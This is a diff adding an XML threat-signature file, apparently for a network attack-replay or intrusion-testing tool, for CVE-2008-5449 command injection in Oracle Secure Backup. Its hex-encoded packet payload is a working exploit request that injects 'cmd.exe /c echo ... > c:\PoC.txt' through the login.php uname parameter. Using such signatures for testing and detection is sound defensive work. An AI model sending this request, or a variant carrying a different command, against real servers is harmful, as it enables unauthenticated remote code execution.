@@ -1,0 +1,85 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Oracle Secure Backup Administration Server login.php Command Injection"/>
+    <EngDesc display="true" value="There exists a command injection vulnerability in Oracle Secure Backup. The vulnerability is due to lack of sanitation of user supplied parameters when processing HTTP requests sent to CGI program login.php. Remote unauthenticated attackers can exploit this vulnerability by sending a crafted HTTP request to the target host. Successful exploitation would allow for arbitrary command execution in the security context of the user running the web server of Oracle Secure Backup. The behaviour of the target is entirely dependent on the intended function of the injected command."/>
+    <Intent display="true">
+      <item value="Command_Execution/Input_Validation_Error"/>
+    </Intent>
+    <Protocol display="true" value="HTTPS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Oracle"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Oracle_Secure_Backup"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Oracle_Secure_Backup_10.1.0.3_and_prior"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2008-5449"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="879345013d46a874e6a911b110ea857e"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633989891408260613"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1263378603" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="J"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="K"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="J"/>
+      <for index="K"/>
+    </for>
+    <for index="H">
+      <for index="J"/>
+      <for index="K"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:CA:00:08" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="00C0" Identification="A5BA" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="3291" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="48621" destPort="$HTTPdestPort" SeqNumber="7B42CD6A" AckNumber="08851CCB" HeaderLength="08" WindowSize="002E" Checksum="4D9D" UrgentPointer="0000" Options="0101080A931268D34F8670AA" Payload="474554202F6C6F67696E2E7068703F617474656D70743D3126756E616D653D253236636D642E6578652B2F632B6563686F2B4173737572656E742B5365637572652B546563686E6F6C6F676965732B2533452B633A5C5C506F432E7478742B2532366563686F267061737377643D313120485454502F312E310D0A486F73743A20646863703230320D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="H" Count="">
+      <Ethernet srcMac="00:0C:29:CA:00:08" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0228" Identification="6C69" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="6A7A" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="48621" SeqNumber="08851CCB" AckNumber="7B42CDF7" HeaderLength="08" WindowSize="01AD" Checksum="4CE1" UrgentPointer="0000" Options="0101080A4F86715F931268D3" Payload="485454502F312E312033303220466F756E640D0A446174653A205765642C203231204A616E20323030392030323A30393A333720474D540D0A5365727665723A204170616368652F312E332E3332202857696E333229205048502F342E332E39206D6F645F73736C2F322E382E3231204F70656E53534C2F302E392E37650D0A582D506F77657265642D42793A205048502F342E332E390D0A5365742D436F6F6B69653A205048505345535349443D37613136633366663933333633336634663966623361333835623466643130363B20706174683D2F0D0A457870697265733A205468752C203139204E6F7620313938312030383A35323A303020474D540D0A43616368652D436F6E74726F6C3A206E6F2D73746F72652C206E6F2D63616368652C206D7573742D726576616C69646174652C20706F73742D636865636B3D302C207072652D636865636B3D300D0A507261676D613A206E6F2D63616368650D0A5365742D436F6F6B69653A205048505345535349443D37613136633366663933333633336634663966623361333835623466643130363B20706174683D2F0D0A4C6F636174696F6E3A202F696E6465782E7068700D0A5472616E736665722D456E636F64696E673A206368756E6B65640D0A436F6E74656E742D547970653A20746578742F68746D6C0D0A0D0A300D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
